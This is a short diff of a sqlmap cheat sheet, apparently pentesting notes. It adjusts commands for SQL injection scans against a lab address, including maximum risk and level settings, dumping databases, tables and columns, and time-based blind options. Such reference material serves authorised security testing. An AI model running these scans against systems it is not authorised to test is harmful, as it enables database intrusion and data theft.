@@ -18,7 +18,7 @@ sqlmap -u "http://10.0.0.1/?category=test&item=1" -p item
 # POST Request
 sqlmap -u "http://10.0.0.1" --data="username=test&password=test"
 # POST Request (specify the request file)
-sqlmap -r request.txt --risk=3 --level=5 --dump
+sqlmap -r request.txt
 # The content of request.txt
 POST /login HTTP/1.1
 Host: 10.0.0.1
@@ -52,7 +52,7 @@ sqlmap -u "http://10.0.0.1/?q=test" -D database_name -T table_name -C column_nam
 
 # --risk=3 (max)
 # --level=5 (max)
-sqlmap -u "http://10.0.0.1/?q=test" --risk=3 --level=5
+sqlmap -u "http://10.0.0.1/?q=test" --risk 3 --level 5
 
 # --all: Retrieve all
 sqlmap -u "http://10.0.0.1/?q=test" --all
@@ -61,6 +61,8 @@ sqlmap -u "http://10.0.0.1/?q=test" --all
 # --delay=2: Time Delay
 sqlmap -u "http://10.0.0.1/?q=test" --technique=U --delay=2
 
+# --time-sec: Sleep time for Time-Based Blind SQLi
+sqlmap -u "http://10.0.0.1/?q=test" --time-sec 2
 
 # --headers: custom HTTP header
 sqlmap --headers="Cookie: value=1234" -u "http://10.0.0.1/?q=test"
